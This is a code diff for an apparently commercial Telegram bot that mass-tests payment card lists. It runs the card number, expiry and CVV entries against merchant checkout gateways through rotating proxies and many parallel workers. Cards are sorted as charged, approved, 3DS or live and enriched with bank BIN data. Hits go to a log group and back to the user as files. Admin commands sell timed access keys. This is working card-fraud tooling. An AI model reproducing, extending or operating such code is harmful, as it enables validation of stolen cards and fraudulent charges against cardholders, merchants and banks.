+    # ═══ SINGLE CHECK ENFORCEMENT ═══════════════════════════════════════════
+    if uid in user_active_check:
+        info = user_active_check[uid]
+        _elapsed = int(time.time() - info.get('started_at', time.time()))
+        _mins = _elapsed // 60
+        await event.reply(pe(
+            f"⛔ 𝗖𝗵𝗲𝗰𝗸 𝗔𝗹𝗿𝗲𝗮𝗱𝘆 𝗥𝘂𝗻𝗻𝗶𝗻𝗴 ⌁ ⚠️\n"
+            f"{SEP}\n"
+            f"[⌯] 𝗢𝗻𝗹𝘆 𝟭 𝗰𝗵𝗲𝗰𝗸 𝗮𝘁 𝗮 𝘁𝗶𝗺𝗲 ⌁ 🔒\n"
+            f"[⌯] 𝗥𝘂𝗻𝗻𝗶𝗻𝗴 𝗳𝗼𝗿 ⌁ {_mins} 𝗺𝗶𝗻 ⌁ ⏱️\n"
+            f"[⌯] 𝗦𝘁𝗼𝗽 𝗰𝘂𝗿𝗿𝗲𝗻𝘁 𝗰𝗵𝗲𝗰𝗸 𝗳𝗶𝗿𝘀𝘁 ⌁ ⛔\n"
+            f"[⌯] 𝗨𝘀𝗲 ⌁ /stopmass ⌁ 🛑"
+        ), parse_mode='html')
+        return
+
+    msg_id = await raw_send(uid, text, rows_stop(), reply_to=event.message.id)
+    if msg_id:
+        user_active_check[uid] = {
+            'session_key': f"{uid}_{msg_id}",
+            'msg_id': msg_id,
+            'started_at': time.time(),
+            'card_count': len(cards),
+        }
+        asyncio.create_task(run_mass_check(uid, cards, msg_id, file_name))
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ START CHECK CALLBACK
+# ══════════════════════════════════════════════════════════════════════════════
+@bot.on(events.CallbackQuery(pattern=r"^start_check_\d+$"))
+async def cb_start_check(event):
+    uid = event.sender_id
+    data = event.data.decode()
+    target_uid = int(data.split('_')[-1])
+    if uid != target_uid:
+        await event.answer("❌ Not your check!", alert=True)
+        return
+    info = pending_checks.pop(uid, None)
+    if not info:
+        await event.answer("⚠️ Session expired. Resend the file.", alert=True)
+        return
+    cards = info['cards']
+    file_name = info.get('file_name', 'mass.txt')
+    sites = _get_sites_for_user(uid)
+    proxies = _get_proxies_for_user_v2(uid)
+    if not sites or not proxies:
+        await event.answer("❌ No sites/proxies available.", alert=True)
+        return
+    await event.answer("🔥 Starting!", alert=False)
+    text = pe(
+        f"[⌯] 𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸 ⌁ 𝗦𝘁𝗮𝗿𝘁𝗶𝗻𝗴 ⌁ 🔥\n"
+        f"{SEP}\n"
+        f"[⌯] 𝗧𝗼𝘁𝗮𝗹 ⌁ {len(cards):,} ⌁ 📦\n"
+        f"[⌯] 𝗦𝗰𝗮𝗻𝗻𝗲𝗱 ⌁ 0 ⌁ ⚙️\n"
+        f"{SEP}\n"
+        f"●○○○○○○○○○○○○○○○○○○○ 0%\n"
+        f"0 / {len(cards):,}\n"
+        f"{SEP}\n"
+        f"⏳ 𝗪𝗮𝗶𝘁𝗶𝗻𝗴...\n"
+        f"{SEP}"
+    )
+    msg_id = await raw_send(uid, text, rows_stop())
+    if msg_id:
+        asyncio.create_task(run_mass_check(uid, cards, msg_id, file_name))
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ MASS CHECK ENGINE
+# ══════════════════════════════════════════════════════════════════════════════
+async def run_mass_check(user_id, cards, progress_msg_id, file_name="mass.txt"):
+    session_key = f"{user_id}_{progress_msg_id}"
+    clear_session_bad_sites()
+    clear_error_log()
+    active_sessions[session_key] = {'paused': False}
+    all_results = {
+        'charged': [],
+        'approved': [],
+        'tds': [],
+        'live': [],
+        'declined': [],
+        'error': [],
+        'total': len(cards),
+        'start_time': time.time(),
+        'last_card_time': time.time(),
+        'start_count': 0,
+        'file_name': file_name,
+    }
+    # ═══ MEMORY LIMIT: max 5000 results per category (avoid RAM blow) ═══
+    _MAX_CAT = 5000
+    proxy_pool = list(_get_proxies_for_user_v2(user_id))
+    proxy_iter = itertools.cycle(proxy_pool) if proxy_pool else None
+    proxy_lock = asyncio.Lock()
+
+    async def _next_proxy():
+        if not proxy_iter:
+            return None
+        async with proxy_lock:
+            return next(proxy_iter)
+
+    try:
+        queue = asyncio.Queue()
+        last_update = [time.time()]
+        for c in cards:
+            queue.put_nowait(c)
+
+        async def worker():
+            while True:
+                # ═══ HARD STOP CHECK #1 ══════════════════════════════════════
+                if _stop_flags.get(session_key):
+                    return
+                if session_key not in active_sessions:
+                    return
+
+                sess = active_sessions.get(session_key)
+                if not sess:
+                    return
+
+                while sess.get('paused', False):
+                    await asyncio.sleep(1)
+                    if _stop_flags.get(session_key):
+                        return
+                    sess = active_sessions.get(session_key)
+                    if not sess:
+                        return
+
+                # ═══ HARD STOP CHECK #2 ══════════════════════════════════════
+                if _stop_flags.get(session_key):
+                    return
+
+                try:
+                    card = queue.get_nowait()
+                except asyncio.QueueEmpty:
+                    break
+
+                # ── SAFETY: reload sites/proxies each iteration ──────────────
+                try:
+                    cur_sites = _get_sites_for_user(user_id)
+                except Exception:
+                    cur_sites = []
+                try:
+                    start_proxy = await _next_proxy()
+                except Exception:
+                    start_proxy = None
+
+                # ── SAFETY: if sites/proxies empty, refill from disk ────────
+                if not cur_sites or not proxy_pool:
+                    cur_sites = _get_sites_for_user(user_id)
+                    _refill = list(_get_proxies_for_user_v2(user_id))
+                    if _refill:
+                        proxy_pool.clear()
+                        proxy_pool.extend(_refill)
+                    if not cur_sites or not proxy_pool:
+                        # Truly nothing left — sleep and retry, do NOT break
+                        await asyncio.sleep(2)
+                        try:
+                            queue.put_nowait(card)
+                        except Exception:
+                            pass
+                        continue
+                t0 = time.time()
+                result = {'card': card, 'status': 'Dead', 'message': 'Error', 'raw_response': ''}
+                try:
+                    result = await asyncio.wait_for(
+                        check_card_with_retry(card, cur_sites, proxy_pool, max_retries=2),
+                        timeout=120
+                    )
+                    result['time'] = round(time.time() - t0, 2)
+                    all_results['last_card_time'] = time.time()
+
+                    # ═══ HARD STOP: skip processing if stopped ═══
+                    if _stop_flags.get(session_key):
+                        break
+
+                    category = _classify_result(result)
+                    bin_info = await get_bin_info(card.split('|')[0])
+                    result['bin_info'] = bin_info
+
+                    # Double-check stop before sending hit
+                    if _stop_flags.get(session_key):
+                        break
+
+                    if category == 'charged':
+                        all_results['charged'].append(result)
+                        increment_charged(user_id, 1)
+                        await send_realtime_hit(user_id, result, 'Charged', file_name)
+                        await send_hit_log_gc(result, 'Charged', user_id)
+                    elif category == 'approved':
+                        all_results['approved'].append(result)
+                        increment_approved(user_id, 1)
+                        await send_realtime_hit(user_id, result, 'Approved', file_name)
+                        await send_hit_log_gc(result, 'Approved', user_id)
+                    elif category == '3ds':
+                        result['status'] = '3DS'
+                        all_results['tds'].append(result)
+                        await send_realtime_hit(user_id, result, '3DS', file_name)
+                        await send_hit_log_gc(result, '3DS', user_id)
+                    elif category == 'live':
+                        result['status'] = 'Live'
+                        all_results['live'].append(result)
+                        await send_realtime_hit(user_id, result, 'Live', file_name)
+                        await send_hit_log_gc(result, 'Live', user_id)
+                    elif category == 'declined':
+                        all_results['declined'].append(result)
+                    else:
+                        all_results['error'].append(result)
+
+                except asyncio.TimeoutError:
+                    result['message'] = 'Timeout'
+                    result['raw_response'] = 'TIMEOUT'
+                    all_results['error'].append(result)
+                except Exception as _we:
+                    print(f"[WORKER-ERR] {type(_we).__name__}: {_we}")
+                    result['message'] = f'Error: {str(_we)[:60]}'
+                    result['raw_response'] = 'WORKER_ERROR'
+                    all_results['error'].append(result)
+
+                checked = (len(all_results['charged']) + len(all_results['approved']) +
+                           len(all_results['tds']) + len(all_results['live']) +
+                           len(all_results['declined']) + len(all_results['error']))
+                now = time.time()
+                if now - last_update[0] >= 3:
+                    last_update[0] = now
+                    try:
+                        await update_mass_progress(user_id, progress_msg_id, all_results, checked, result)
+                    except Exception:
+                        pass
+
+        # ═══ ADAPTIVE WORKER COUNT with GLOBAL LIMIT ═══
+        _active_count = len(active_sessions)
+
+        # Per-user base workers based on load
+        if _active_count >= 3:
+            _base_workers = HEAVY_LOAD_WORKERS   # 25
+        elif _active_count >= 2:
+            _base_workers = MEDIUM_LOAD_WORKERS  # 40
+        else:
+            _base_workers = LIGHT_LOAD_WORKERS   # 60
+
+        _user_workers = min(MASS_WORKERS, len(cards), _base_workers)
+        print(f"[MASS] active_sessions={_active_count} base_workers={_base_workers}")
+
+        # Global limit — prevent total workers > GLOBAL_MAX_WORKERS
+        _available_global = _GLOBAL_WORKER_SEM.get_available()
+        _user_workers = min(_user_workers, _available_global)
+        _user_workers = max(5, _user_workers)  # minimum 5
+
+        # Alive proxies check
+        import os as _os
+        _alive_file = _os.path.join(_os.path.dirname(_os.path.abspath(__file__)), 'alive_proxies.txt')
+        if _os.path.exists(_alive_file):
+            try:
+                with open(_alive_file) as _f:
+                    _alive_count = sum(1 for _ in _f if _.strip())
+                if _alive_count > 0:
+                    _safe = max(5, min(_alive_count // 3, 50))
+                    _user_workers = min(_user_workers, _safe)
+                    print(f"[MASS] alive_proxies={_alive_count}")
+            except Exception:
+                pass
+
+        # Reserve from global pool
+        _granted = _GLOBAL_WORKER_SEM.acquire(_user_workers)
+        print(f"[MASS] user={user_id} workers={_granted} cards={len(cards)} global_active={_GLOBAL_WORKER_SEM.get_active()}")
+
+        try:
+            workers = [asyncio.create_task(worker()) for _ in range(_granted)]
+            await asyncio.gather(*workers, return_exceptions=True)
+        finally:
+            _GLOBAL_WORKER_SEM.release(_granted)
+            print(f"[MASS] Released {_granted} workers · global_active={_GLOBAL_WORKER_SEM.get_active()}")
+
+    except Exception:
+        pass
+    finally:
+        # ═══ CLEANUP: flag + session + tracking ═══
+        _was_stopped = _stop_flags.get(session_key, False)
+        _stop_flags.pop(session_key, None)
+        active_sessions.pop(session_key, None)
+        user_active_check.pop(user_id, None)
+        
+        # ═══ Only send final results if NOT stopped ═══
+        if not _was_stopped:
+            try:
+                await send_final_results(user_id, all_results)
+            except Exception as _fe:
+                print(f"send_final_results error: {_fe}")
+async def update_mass_progress(user_id, message_id, results, checked, last_res=None):
+    total = results['total']
+    pct = int(100 * checked / total) if total > 0 else 0
+
+    bar_width = 20
+    filled = int(bar_width * checked / total) if total > 0 else 0
+    bar = "●" * filled + "○" * (bar_width - filled)
+
+    latest_card = "0000••••••••0000|00|0000|000"
+    status_text = "Waiting"
+    status_icon = "5042036407137207122"
+    status_raw = ""
+    status_style = "primary"
+
+    if last_res:
+        raw = (last_res.get('raw_response') or '').upper()
+        st = last_res.get('status', '')
+        card = last_res.get('card', '') or ''
+        parts = card.split('|')
+        if len(parts) == 4:
+            num = parts[0]
+            masked = (num[:4] + "•" * 8 + num[-4:]) if len(num) >= 8 else num
+            latest_card = masked + "|" + parts[1] + "|" + parts[2] + "|" + parts[3]
+        else:
+            latest_card = card
+
+        # ═══ SHOW REAL RESPONSE ═══
+        _msg_short = (last_res.get('message') or '').strip()
+        # Truncate message to 40 chars for button
+        if len(_msg_short) > 40:
+            _msg_short = _msg_short[:40] + "..."
+
+        if st == 'Charged':
+            status_text = "Charged Success"
+            status_icon = "5778251341348476741"
+            status_raw = "CHARGED"
+            status_style = "success"
+        elif st == 'Approved':
+            status_text = "Approved"
+            status_icon = "5305417687357203905"
+            status_raw = raw or "APPROVED"
+            status_style = "success"
+        elif st == 'Live':
+            status_text = "Live"
+            status_icon = "5447453226498552490"
+            status_raw = raw or "LIVE"
+            status_style = "primary"
+        elif st == '3DS':
+            status_text = "3DS Required"
+            status_icon = "5420323339723881652"
+            status_raw = raw or "3DS_REQUIRED"
+            status_style = "primary"
+        elif st in ('Dead', 'Declined'):
+            # ═══ SHOW REAL DECLINE REASON ═══
+            _display = _msg_short or raw or "Declined"
+            status_text = "Declined"
+            status_icon = "6168089880535501141"
+            status_raw = _display[:50]   # ← real message, not hardcoded
+            status_style = "danger"
+        else:
+            # ═══ SHOW REAL ERROR ═══
+            _display = _msg_short or raw or "Error"
+            status_text = st or "Error"
+            status_icon = "6168089880535501141"
+            status_raw = _display[:50]   # ← real message
+            status_style = "danger"
+
+    # Real bold letters — build from a map so we control exactly
+    # Using unicode Math Sans-Serif Bold alphabet
+    def b(s):
+        out = []
+        for ch in s:
+            code = ord(ch)
+            if 65 <= code <= 90:  # A-Z
+                out.append(chr(code - 65 + 0x1D5D4))
+            elif 97 <= code <= 122:  # a-z
+                out.append(chr(code - 97 + 0x1D5EE))
+            elif 48 <= code <= 57:  # 0-9
+                out.append(chr(code - 48 + 0x1D7EC))
+            else:
+                out.append(ch)
+        return "".join(out)
+
+    text = pe(
+        "[=] " + b("Mass Checker") + " \u2301 " + b("Live") + " \u2301 \U0001f525\n"
+        "\n"
+        + SEP + "\n"
+        + "[=] " + b("Total") + " \u2301 " + f"{total:,}" + "\n"
+        + "[=] " + b("Checked") + " \u2301 " + f"{checked:,}" + "\n"
+        + "[=] " + b("Charged") + " \u2301 " + str(len(results['charged'])) + "\n"
+        + "[=] " + b("Approved") + " \u2301 " + str(len(results['approved'])) + "\n"
+        + "[=] " + b("3DS") + " \u2301 " + str(len(results['tds'])) + "\n"
+        + "[=] " + b("Declined") + " \u2301 " + str(len(results['declined'])) + "\n"
+        + "[=] " + b("Workers") + " \u2301 " + str(MASS_WORKERS) + "\n"
+        "\n"
+        + SEP + "\n"
+        "\n"
+        + bar + " " + str(pct) + "% | " + f"{checked:,}" + " / " + f"{total:,}" + "\n"
+    )
+
+    # ═══ CARD BUTTON — copy on tap (real card, not masked) ═══
+    _real_card = (last_res.get('card') if last_res else '') or ''
+    if _real_card and _real_card != 'N/A':
+        _card_btn = {
+            "text": latest_card,
+            "copy_text": {"text": _real_card},   # ← tap to copy
+            "style": "primary",
+            "icon_custom_emoji_id": "5445260044398524944",
+        }
+    else:
+        _card_btn = {
+            "text": latest_card,
+            "callback_data": "noop",
+            "style": "primary",
+            "icon_custom_emoji_id": "5445260044398524944",
+        }
+
+    buttons = [
+        [_card_btn],
+        [{
+            "text": status_text + " \u2014 " + status_raw,
+            "callback_data": "noop",
+            "style": status_style,
+            "icon_custom_emoji_id": status_icon,
+        }],
+        [
+            {
+                "text": "Pause",
+                "callback_data": "pause_mass",
+                "style": "primary",
+                "icon_custom_emoji_id": "5042036407137207122",
+            },
+            {
+                "text": "Stop",
+                "callback_data": "stop_mass",
+                "style": "danger",
+                "icon_custom_emoji_id": "6181277564732972292",
+            }
+        ]
+    ]
+
+    try:
+        from keyboards import _http_session
+        from config import BOT_TOKEN
+        api_url = "https://api.telegram.org/bot" + BOT_TOKEN + "/editMessageText"
+        payload = {
+            "chat_id": user_id,
+            "message_id": message_id,
+            "text": text,
+            "parse_mode": "HTML",
+            "reply_markup": {"inline_keyboard": buttons},
+            "link_preview_options": {"is_disabled": True},
+        }
+        _http_session.post(api_url, json=payload, timeout=10)
+    except Exception as e:
+        print("update_mass_progress error: " + str(e))
+
+
+async def send_final_results(user_id, results):
+    elapsed = int(time.time() - results['start_time'])
+    h, m, s = elapsed // 3600, (elapsed % 3600) // 60, elapsed % 60
+    total = results['total']
+    checked = (len(results['charged']) + len(results['approved']) +
+               len(results['tds']) + len(results['live']) +
+               len(results['declined']) + len(results['error']))
+    pct = int(100 * checked / total) if total > 0 else 0
+    bar_width = 20
+    filled = int(bar_width * checked / total) if total > 0 else 0
+    bar = f"{'●' * filled}{'○' * (bar_width - filled)}"
+
+    ch_count = len(results['charged'])
+    ap_count = len(results['approved'])
+    td_count = len(results['tds'])
+    lv_count = len(results['live'])
+    dc_count = len(results['declined'])
+    er_count = len(results['error'])
+    cname = await get_display_name(user_id)
+    time_fmt = f"{h}h {m}m {s}s" if h else (f"{m}m {s}s" if m else f"{s}s")
+
+    summary = pe(
+        f"[⌯] 𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸 ⌁ 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲 ⌁ ✅\n"
+        f"{SEP}\n"
+        f"[⌯] 𝗧𝗼𝘁𝗮𝗹 ⌁ {total:,} ⌁ 📦\n"
+        f"[⌯] 𝗦𝗰𝗮𝗻𝗻𝗲𝗱 ⌁ {checked:,} ⌁ ⚙️\n"
+        f"[⌯] 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 ⌁ {ch_count} ⌁ 💎\n"
+        f"[⌯] 𝗟𝗶𝘃𝗲 ⌁ {lv_count} ⌁ 💳\n"
+        f"[⌯] 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ⌁ {ap_count} ⌁ ✅\n"
+        f"[⌯] 𝟯𝗗𝗦 ⌁ {td_count} ⌁ ⚠️\n"
+        f"[⌯] 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ⌁ {dc_count} ⌁ 🚫\n"
+        f"[⌯] 𝗘𝗿𝗿𝗼𝗿 ⌁ {er_count} ⌁ ❌\n"
+        f"{SEP}\n"
+        f"{bar} {pct}%\n"
+        f"{checked:,} / {total:,}\n"
+        f"{SEP}\n"
+        f"[⌯] 𝗧𝗶𝗺𝗲 ⌁ {time_fmt} ⌁ ⏱️\n"
+        f"{SEP}\n"
+        f"[⌯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗿 ⌁ 🔰 {cname}"
+    )
+    await bot.send_message(user_id, summary, parse_mode='html')
+
+    if results['charged']:
+        await _send_result_file(user_id, 'charged.txt', 'CHARGED', results['charged'], "💎")
+    if results['live']:
+        await _send_result_file(user_id, 'live.txt', 'LIVE', results['live'], "💳")
+    if results['approved']:
+        await _send_result_file(user_id, 'approved.txt', 'APPROVED', results['approved'], "✅")
+    if results['tds']:
+        await _send_result_file(user_id, '3ds.txt', '3DS', results['tds'], "⚠️")
+    if results['declined']:
+        await _send_result_file(user_id, 'declined.txt', 'DECLINED', results['declined'], "🚫")
+    if results['error']:
+        await _send_result_file(user_id, 'error.txt', 'ERROR', results['error'], "❌")
+
+
+async def _send_result_file(user_id, filename, label, results_list, emoji):
+    D = "─" * 44
+    lines = [f"{D}\n  {BOT_BRAND}  ◈  {label} ({len(results_list)})\n{D}\n\n"]
+    for r in results_list:
+        lines.append(_file_row(label, r))
+    lines.append(f"\n{D}\n  Total: {len(results_list)}\n{D}\n")
+    async with aiofiles.open(filename, 'w') as f:
+        await f.write("".join(lines))
+    try:
+        await bot.send_file(
+            user_id, filename,
+            caption=pe(f"[⌯] {label} ⌁ {len(results_list)} {emoji}"),
+            parse_mode='html'
+        )
+    except Exception as e:
+        print(f"Send file error: {e}")
+    try:
+        os.remove(filename)
+    except:
+        pass
+
+
+def _file_row(label, r):
+    gate = r.get('gateway', 'Shopify')
+    price = r.get('price', '-')
+    bi = r.get('bin_info')
+    raw = r.get('raw_response', '') or ''
+    msg = (r.get('message', '') or '').split('\n')[0][:80]
+    if bi:
+        brand, btype, level, bank, country, flag = bi
+        bank_line = f"  Bank: {bank} | {country} {flag} | {brand} {btype} {level}\n"
+    else:
+        bank_line = ""
+    raw_line = f"  Raw: {raw}\n" if raw else ""
+    return f"  [{label}]\n  CC: {r['card']}\n  Gateway: {gate}\n  Amount: {price}\n  Message: {msg}\n{raw_line}{bank_line}  {'─'*36}\n"
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ STOP / PAUSE MASS
+# ══════════════════════════════════════════════════════════════════════════════
+@bot.on(events.CallbackQuery(pattern=b"stop_mass"))
+async def cb_stop_mass(event):
+    uid = event.sender_id
+    killed = 0
+
+    # ═══ HARD KILL: set stop flag + remove session ═══════════════════════════
+    for k in list(active_sessions.keys()):
+        if k.startswith(f"{uid}_"):
+            _stop_flags[k] = True            # ← hard stop signal
+            active_sessions.pop(k, None)     # ← remove session
+            killed += 1
+
+    # Also clear from user_active_check
+    user_active_check.pop(uid, None)
+
+    if killed:
+        await event.answer("⛔ Stopped!", alert=True)
+        try:
+            await raw_edit(event.chat_id, event.message_id,
+                           pe(f"⛔ 𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸 ⌁ 𝗦𝘁𝗼𝗽𝗽𝗲𝗱\n{SEP}\nCancelled by user."), [])
+        except:
+            pass
+    else:
+        await event.answer("No active session.", alert=True)
+
+
+@bot.on(events.CallbackQuery(pattern=b"pause_mass"))
+async def cb_pause_mass(event):
+    uid = event.sender_id
+    paused = False
+    found = False
+    for k in list(active_sessions.keys()):
+        if k.startswith(f"{uid}_"):
+            sess = active_sessions[k]
+            sess['paused'] = not sess.get('paused', False)
+            paused = sess['paused']
+            found = True
+            break
+
+    if not found:
+        await event.answer("No active session.", alert=True)
+        return
+
+    if paused:
+        await event.answer("⏸️ Paused", alert=True)
+    else:
+        await event.answer("▶️ Resumed", alert=True)
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ GRANT / AUTH / REVOKE
+# ══════════════════════════════════════════════════════════════════════════════
+@bot.on(events.NewMessage(pattern=r'^/grant\s+'))
+async def grant_command(event):
+    if not is_admin(event.sender_id):
+        await event.reply(pe(f"❌ Admin only"), parse_mode='html')
+        return
+    parts = event.message.text.split()
+    if len(parts) < 3:
+        await event.reply(pe(f"❌ Usage: /grant uid days"), parse_mode='html')
+        return
+    try:
+        target = int(parts[1]); days = float(parts[2])
+    except:
+        await event.reply(pe(f"❌ Invalid format"), parse_mode='html')
+        return
+    activate_plan(target, "grant", "custom", days, added_by=event.sender_id)
+    await event.reply(pe(
+        f"[⌯] 𝗔𝗰𝗰𝗲𝘀𝘀 𝗚𝗿𝗮𝗻𝘁𝗲𝗱 ⌁ ✅\n{SEP}\n"
+        f"[⌯] 𝗨𝘀𝗲𝗿 ⌁ <code>{target}</code>\n"
+        f"[⌯] 𝗗𝗮𝘆𝘀 ⌁ {days} ⌁ 📅\n"
+        f"[⌯] 𝗘𝘅𝗽𝗶𝗿𝗲𝘀 ⌁ {format_expiry(target)} ⌁ ⏳"
+    ), parse_mode='html')
+
+
+@bot.on(events.NewMessage(pattern=r'^/auth\s+'))
+async def auth_command(event):
+    if not is_admin(event.sender_id):
+        await event.reply(pe(f"❌ Admin only"), parse_mode='html')
+        return
+    parts = event.message.text.split()
+    if len(parts) < 3:
+        await event.reply(pe(f"❌ Usage: /auth uid days"), parse_mode='html')
+        return
+    try:
+        target = int(parts[1]); days = float(parts[2])
+    except:
+        await event.reply(pe(f"❌ Invalid format"), parse_mode='html')
+        return
+    activate_plan(target, "auth", "custom", days, added_by=event.sender_id)
+    await event.reply(pe(
+        f"[⌯] 𝗔𝘂𝘁𝗵 𝗔𝗰𝗰𝗲𝘀𝘀 ⌁ 🔐\n{SEP}\n"
+        f"[⌯] 𝗨𝘀𝗲𝗿 ⌁ <code>{target}</code>\n"
+        f"[⌯] 𝗗𝗮𝘆𝘀 ⌁ {days} ⌁ 📅\n"
+        f"[⌯] 𝗘𝘅𝗽𝗶𝗿𝗲𝘀 ⌁ {format_expiry(target)} ⌁ ⏳"
+    ), parse_mode='html')
+
+
+@bot.on(events.NewMessage(pattern=r'^/revoke\s+'))
+async def revoke_command(event):
+    if not is_admin(event.sender_id):
+        await event.reply(pe(f"❌ Admin only"), parse_mode='html')
+        return
+    try:
+        target = int(event.message.text.split(' ', 1)[1].strip())
+    except:
+        await event.reply(pe(f"❌ Usage: /revoke uid"), parse_mode='html')
+        return
+    if revoke_plan(target):
+        await event.reply(pe(f"[⌯] 𝗔𝗰𝗰𝗲𝘀𝘀 𝗥𝗲𝘃𝗼𝗸𝗲𝗱 ⌁ ❌\n{SEP}\n[⌯] 𝗨𝘀𝗲𝗿 ⌁ <code>{target}</code>"), parse_mode='html')
+    else:
+        await event.reply(pe(f"❌ User not found"), parse_mode='html')
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ▸ KEYS — /genkey 15 10 format
+# ══════════════════════════════════════════════════════════════════════════════
+@bot.on(events.NewMessage(pattern=r'^/genkey'))
+async def gen_key_command(event):
+    if not is_admin(event.sender_id):
+        await event.reply(pe(f"❌ Admin only"), parse_mode='html')
+        return
+
+    parts = event.message.text.split()
+
+    # ═══ Help / Usage if no args ═════════════════════════════════════════════
+    if len(parts) < 4:
+        await event.reply(pe(
+            f"[⌯] 𝗚𝗲𝗻 𝗞𝗲𝘆 ⌁ 𝗨𝘀𝗮𝗴𝗲 ⌁ 🔑\n"
+            f"{SEP}\n"
+            f"[⌯] 𝗙𝗼𝗿𝗺𝗮𝘁 ⌁ /genkey days max_uses count\n"
+            f"{SEP}\n"
+            f"[⌯] 𝗘𝘅𝗮𝗺𝗽𝗹𝗲 𝟭 ⌁ /genkey 10 1 10\n"
+            f"[⌯] 𝗠𝗲𝗮𝗻𝘀 ⌁ 10 days · 1 user · 10 keys\n"
+            f"{SEP}\n"
+            f"[⌯] 𝗘𝘅𝗮𝗺𝗽𝗹𝗲 𝟮 ⌁ /genkey 15 5 1\n"
+            f"[⌯] 𝗠𝗲𝗮𝗻𝘀 ⌁ 15 days · 5 users · 1 key\n"
+            f"{SEP}\n"
+            f"[⌯] 𝗥𝗮𝗻𝗴𝗲 ⌁ days 1-365 · max_uses 1-100 · count 1-50"
+        ), parse_mode='html')
+        return
+
+    # ═══ Parse args ══════════════════════════════════════════════════════════
+    try:
+        days      = int(parts[1])
+        max_uses  = int(parts[2])
+        count     = int(parts[3])
+    except ValueError:
+        await event.reply(pe(f"❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗻𝘂𝗺𝗯𝗲𝗿𝘀 ⌁ 𝗨𝘀𝗲 𝗱𝗶𝗴𝗶𝘁𝘀 𝗼𝗻𝗹𝘆"), parse_mode='html')
+        return
+
+    # ═══ Validate ranges ═════════════════════════════════════════════════════
+    if not (1 <= days <= 365):
+        await event.reply(pe(f"❌ 𝗗𝗮𝘆𝘀 𝗺𝘂𝘀𝘁 𝗯𝗲 𝟭-𝟯𝟲𝟱"), parse_mode='html')
+        return
+    if not (1 <= max_uses <= 100):
+        await event.reply(pe(f"❌ 𝗠𝗮𝘅 𝘂𝘀𝗲𝘀 𝗺𝘂𝘀𝘁 𝗯𝗲 𝟭-𝟭𝟬𝟬"), parse_mode='html')
+        return
+    if not (1 <= count <= 50):
+        await event.reply(pe(f"❌ 𝗖𝗼𝘂𝗻𝘁 𝗺𝘂𝘀𝘁 𝗯𝗲 𝟭-𝟱𝟬"), parse_mode='html')
+        return
+
+    # ═══ Use EXACT days user entered — no plan name override ════════════════
+    plan_name = f"{days}-Day Plan"
+    plan_duration = f"{days} Days"
+    plan_key = "custom"
+    # Keep a friendlier name only for display
+    if days <= 1:
+        plan_display = "Trial"
+        plan_duration = "3 Hours"
+    elif days == 7:
+        plan_display = "Weekly"
+    elif days == 15:
+        plan_display = "Bi-Weekly"
+    elif days == 30:
+        plan_display = "Monthly"
+    else:
+        plan_display = f"{days}-Day"
+    plan_name = plan_display
+
+    # ═══ Generate keys ═══════════════════════════════════════════════════════
+    keys = load_keys()
+    generated = []
+    key_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+
+    for _ in range(count):
+        # Ensure unique key (avoid collision)
+        for _retry in range(10):
+            parts_k = []
+            for _ in range(3):
+                part = ''.join(secrets.choice(key_chars) for _ in range(5))
+                parts_k.append(part)
+            key = f"RXP-{'-'.join(parts_k)}"
+            if key not in keys:
+                break
+
+        keys[key] = {
+            "plan": plan_key,
+            "days": days,
+            "max_uses": max_uses,
+            "usage_count": 0,
+            "created_at": time.time(),
+            "redeemed_by": None,
+            "redeemed_at": None,
+        }
+        generated.append(key)
+
+    save_keys(keys)
+
+    # ═══ Output ══════════════════════════════════════════════════════════════
+    if count == 1:
+        key = generated[0]
+        await event.reply(pe(
+            f"[⌯] 𝗞𝗲𝘆 ⌁ 𝙶𝚎𝚗𝚎𝚛𝚊𝚝𝚎𝚍 ⌁ ⚡\n"
+            f"\n"
+            f"{SEP}\n"
+            f"[⌯] 𝗞𝗲𝘆 ⌁ <code>{key}</code>\n"
+            f"[⌯] 𝗣𝗹𝗮𝗻 ⌁ {plan_name} ⌁ ⚡\n"
+            f"[⌯] 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻 ⌁ {plan_duration} ⌁ ⚡\n"
+            f"[⌯] 𝗠𝗮𝘅 𝗨𝘀𝗲𝘀 ⌁ {max_uses} ⌁ ⚡\n"
+            f"\n"
+            f"{SEP}\n"
+            f"[⌯] 𝗥𝗲𝗱𝗲𝗲𝗺 ⌁ /redeem KEY ⌁ ⚡"
+        ), parse_mode='html')
+    else:
+        # Show up to 20 keys in message, rest as file
+        show_keys = generated[:20]
+        key_list = "\n".join([f"[⌯] <code>{k}</code>" for k in show_keys])
+        more = f"\n<i>...and {len(generated) - 20} more (sent as file)</i>" if len(generated) > 20 else ""
+
+        await event.reply(pe(
+            f"[⌯] 𝗞𝗲𝘆𝘀 ⌁ 𝙶𝚎𝚗𝚎𝚛𝚊𝚝𝗲𝗱 ⌁ {count} ⚡\n"
+            f"\n"
+            f"{SEP}\n"
+            f"{key_list}{more}\n"
+            f"\n"
+            f"{SEP}\n"
+            f"[⌯] 𝗣𝗹𝗮𝗻 ⌁ {plan_name} ⌁ ⚡\n"
+            f"[⌯] 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻 ⌁ {plan_duration} ⌁ ⚡\n"
+            f"[⌯] 𝗠𝗮𝘅 𝗨𝘀𝗲𝘀 ⌁ {max_uses} ⌁ ⚡\n"
+            f"{SEP}\n"
+            f"[⌯] 𝗥𝗲𝗱𝗲𝗲𝗺 ⌁ /redeem KEY ⌁ ⚡"
+        ), parse_mode='html')
+
+        # If > 20 keys, send full list as .txt file
+        if len(generated) > 20:
+            ts = int(time.time())
+            filename = f"/tmp/rxo_uploads/keys_{ts}.txt"
+            os.makedirs("/tmp/rxo_uploads", exist_ok=True)
+
